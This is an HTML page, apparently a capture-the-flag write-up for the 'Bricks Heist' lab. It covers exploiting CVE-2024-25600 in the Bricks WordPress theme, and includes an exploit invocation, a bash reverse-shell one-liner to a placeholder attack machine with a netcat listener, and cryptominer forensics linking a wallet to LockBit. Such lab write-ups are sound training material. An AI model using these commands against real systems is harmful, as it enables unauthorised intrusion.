@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Bricks Heist</title>
+    
+    <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon" />
+    <link rel="stylesheet" href="../css/main.css" />
+    <link rel="stylesheet" href="../css/media.css" />
+    <link rel="stylesheet" href="../css/writeups.css" />
+    
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css"
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+
+    <script defer src="../js/writeups.js"></script>
+</head>
+
+<body class="left-aligned-hero">
+
+    <!-- Navbar Placeholder -->
+    <div id="nav-placeholder"></div>
+
+    <!-- Content Wrapper -->
+    <div id="content" class="fade-in">
+      
+      <!-- Hero Section -->
+      <section id="home" class="hero">
+        <div class="container container-lg">
+            <a href="../writeups.html" class="back-arrow" data-aos="fade-right" data-aos-duration="1000">
+                ← Back to Writeups
+            </a>
+            <div class="hero-content">
+                <div class="hero-image" data-aos="fade-up" data-aos-duration="1000">
+                    <img src="../img/writeups/bricks_heist/bricks_heist.png" alt="Bricks Heist" />
+                </div>
+                <h1 class="hero-heading" data-aos="fade-up" data-aos-duration="1200">Bricks Heist</h1>
+                <p class="writeup-meta" data-aos="fade-up" data-aos-duration="1400">
+                    <strong>Category:</strong> Web Hacking | <strong>Difficulty:</strong> Easy | <strong>Date:</strong> Feb 09, 2025
+                </p>
+                <p class="writeup-summary" data-aos="fade-up" data-aos-duration="1600">
+                    Crack the code, command the exploit! Dive into the heart of the system with just an RCE CVE as your key. 
+                    Can you hack back the server and identify what happened?
+                </p>
+            </div>
+        </div>
+      </section>
+
+      <!-- Writeup Content -->
+    <section id="writeup-content" class="writeup-content">
+      <div class="container">
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Introduction</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          This challenge required exploiting a vulnerable web application to regain access to a compromised server.  
+          The main objectives included identifying and leveraging an <strong>RCE vulnerability</strong>, escalating privileges, and uncovering critical system information.  
+          Successful exploitation provided insight into how the breach occurred and allowed us to reclaim control over the system.
+        </p>
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Step 1: Information Gathering & Enumeration</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          The first step was to analyze the source code of the target webpage.  
+          By inspecting the <strong>source page</strong>, we found references to <code>wp-content</code> and <code>wp-json</code>,  
+          indicating that the site is running <strong>WordPress</strong>.
+        </p>
+        <img src="../img/writeups/bricks_heist/source_wp_content.png" alt="WordPress Found in Source Code" width="800" data-aos="fade-right" data-aos-duration="1000">
+        <p data-aos="fade-right" data-aos-duration="1200">
+          Additionally, the presence of the <strong>WordPress favicon</strong> further confirmed that the target is a WordPress site.
+        </p>
+        <img src="../img/writeups/bricks_heist/wp_favicon.png" alt="WordPress Favicon" width="200" data-aos="fade-right" data-aos-duration="1000">
+        <h3 class="sub-section-title" data-aos="fade-right" data-aos-duration="1000">Scanning with WPScan</h3>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          Next, we used <strong>WPScan</strong> to gather more information about the target:
+        </p>
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>
+            wpscan --url {url} --disable-tls-check
+          </code>
+        </pre>
+        <img src="../img/writeups/bricks_heist/wpscan_results.png" alt="WPScan Results" width="800" data-aos="fade-right" data-aos-duration="1000">
+        <p data-aos="fade-right" data-aos-duration="1200">
+          The scan revealed that the site is using the <strong>Bricks 1.9.5</strong> theme.  
+          We then searched for known vulnerabilities related to this theme.
+        </p>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          A Proof-of-Concept (PoC) for <strong>CVE-2024-25600</strong> can be found here:
+          <a href="https://github.com/Tornad0007/CVE-2024-25600-Bricks-Builder-plugin-for-WordPress.git" target="_blank">[PoC Repository]</a>.
+        </p>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          And the corresponding <strong>exploit script</strong> is available here:
+          <a href="https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT" target="_blank">[Exploit Script]</a>.
+        </p>
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Step 2: Exploitation</h2>
+
+        <p data-aos="fade-right" data-aos-duration="1200">
+          After identifying the vulnerable <strong>Bricks 1.9.5</strong> theme, we proceeded to exploit it using the available script.
+          First, we installed the necessary dependencies as instructed in the GitHub repository:
+        </p>
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>
+            pip3 install -r requirements.txt
+          </code>
+        </pre>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          Once the dependencies were installed, we executed the exploit to gain a reverse shell:
+        </p>
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>
+            python3 shell.py -u &lt;URL&gt;
+          </code>
+        </pre>
+        <br>
+        <img src="../img/writeups/bricks_heist/exploit_execution.png" alt="Exploit Execution" width="800" data-aos="fade-right" data-aos-duration="1000">
+        <p data-aos="fade-right" data-aos-duration="1200"></p>
+          Running the exploit successfully granted us a shell on the target system, allowing us to investigate further.
+        </p>
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Step 3: Privilege Escalation</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          After gaining initial access, we needed to escalate our privileges to get full control over the system.  
+          We executed a <strong>bash reverse shell</strong> to establish a more stable connection:
+        </p>
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>
+            bash -c 'exec bash -i &>/dev/tcp/{ATTACK_MACHINE}/4444 <&1'
+          </code>
+        </pre>
+        <p data-aos="fade-right" data-aos-duration="1200"></p>
+            On the attack machine, we set up a <strong>netcat listener</strong> to catch the incoming shell:
+        </p>
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+            <code>
+            nc -lvnp 4444
+            </code>
+        </pre>
+        <p data-aos="fade-right" data-aos-duration="1200">
+            Once the connection was established, we had a <strong>fully interactive shell</strong>,  
+            allowing us to continue our investigation and execute further commands.
+        </p>
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Step 4: Answering the Challenge Questions</h2>
+        <h3 class="sub-section-title" data-aos="fade-right" data-aos-duration="1000">1. What is the content of the hidden .txt file in the web folder?</h3>
+        <p data-aos="fade-right" data-aos-duration="1200">
+        During enumeration, we discovered a hidden <code>.txt</code> file inside the web folder.
+        Using basic directory listing, we identified its location and retrieved its contents:
+        </p>
+        <img src="../img/writeups/bricks_heist/hidden_txt.png" alt="Hidden .txt File Content" width="800" data-aos="fade-right" data-aos-duration="1000">
+        <p data-aos="fade-right" data-aos-duration="1200">
+        Additionally, within <code>wp-config.php</code>, we found <strong>hardcoded credentials</strong>,  
+        which allowed us to log in to <strong>phpMyAdmin</strong> for further analysis.
+        </p>
+        <img src="../img/writeups/bricks_heist/wp_config_creds.png" alt="Hardcoded Credentials in wp-config.php" width="800" data-aos="fade-right" data-aos-duration="1000">
+        <h3 class="sub-section-title" data-aos="fade-right" data-aos-duration="1000">2. What is the name of the suspicious process?</h3>
+        <p data-aos="fade-right" data-aos-duration="1200">
+        We listed all running <strong>Linux Process</strong> using:
+        </p>
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+        <code>
+            systemctl list-units --type=service
+        </code>
+        </pre>
+        <p data-aos="fade-right" data-aos-duration="1200">
+        Among the services, we identified a <strong>suspicious process</strong> named <strong>TRYHACK3M</strong>.
+        </p>
+        <img src="../img/writeups/bricks_heist/suspicious_process.png" alt="Suspicious Process Found" width="800" data-aos="fade-right" data-aos-duration="1000">
+        <h3 class="sub-section-title" data-aos="fade-right" data-aos-duration="1000">3. What is the service name affiliated with the suspicious process?</h3>
+        <p data-aos="fade-right" data-aos-duration="1200">
+        To inspect the process further, we extracted the <strong>service file</strong> using:
+        </p>
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+        <code>
+            systemctl cat ubuntu.service
+        </code>
+        </pre>
+        <p data-aos="fade-right" data-aos-duration="1200">
+        This revealed that the <strong>suspicious process</strong> is associated with the service:
+        <strong>ubuntu.service</strong>.
+        </p>
+        <img src="../img/writeups/bricks_heist/ubuntu_service.png" alt="Ubuntu Service Details" width="800" data-aos="fade-right" data-aos-duration="1000">
+        <h3 class="sub-section-title" data-aos="fade-right" data-aos-duration="1000">4. What is the log file name of the miner instance?</h3>
+        <p data-aos="fade-right" data-aos-duration="1200">
+        Searching through the <code>/lib/NetworkManager</code> directory,  
+        we discovered a <strong>log file</strong> containing traces of mining activity:
+        </p>
+        <img src="../img/writeups/bricks_heist/inet_conf_log.png" alt="inet.conf Mining Logs" width="800" data-aos="fade-right" data-aos-duration="1000">
+        <p data-aos="fade-right" data-aos-duration="1200">
+        The mining logs were stored in the file: <strong>inet.conf</strong>.
+        </p>
+        <h3 class="sub-section-title" data-aos="fade-right" data-aos-duration="1000">5. What is the wallet address of the miner instance?</h3>
+        <p data-aos="fade-right" data-aos-duration="1200">
+        We extracted the <strong>wallet address</strong> from the mining log file by inspecting <code>inet.conf</code>.
+        </p>
+        <p data-aos="fade-right" data-aos-duration="1200">
+        The address appeared <strong>encoded</strong>, so we used <strong>CyberChef’s Magic Decoder</strong> to extract it:
+        </p>
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+        <code>
+            Decoded Wallet Address:
+            <br>
+            bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
+            <br>
+            bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
+        </code>
+        </pre>
+        <h3 class="sub-section-title" data-aos="fade-right" data-aos-duration="1000">6. The wallet address used has been involved in transactions between wallets belonging to which threat group?</h3>
+        <p data-aos="fade-right" data-aos-duration="1200">
+        By searching the <strong>decoded wallet address</strong> on <a href="https://blockchair.com/bitcoin/privacy-o-meter/c21bd9fec8cf39e711eb4b31f68203eaf65ccc755a61deea539501f9566fa80e" target="_blank">Blockchair</a>,  
+        we found that it was linked to multiple transactions associated with a known <strong>threat group</strong>.
+        </p>
+        <img src="../img/writeups/bricks_heist/lockbit_transactions.png" alt="LockBit Group Wallet Transactions" width="800" data-aos="fade-right" data-aos-duration="1000">
+        <p data-aos="fade-right" data-aos-duration="1200">
+        The transactions were traced back to <strong>LockBit</strong>, a notorious ransomware group.
+        </p>
+        </div>
+      </section>
+    </div>
+
+    <!-- Footer Placeholder -->
+    <div id="footer-placeholder"></div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+    <script src="../js/components.js"></script>
+    <script type="module" src="../js/main.js"></script>
+    <script>
+      AOS.init({
+        duration: 1000,
+        easing: 'ease-in-out',
+        once: true,
+      });
+      document.addEventListener("DOMContentLoaded", () => {
+        document.getElementById("content").classList.add("fade-in-active");
+      });
+    </script>
+</body>
+</html>
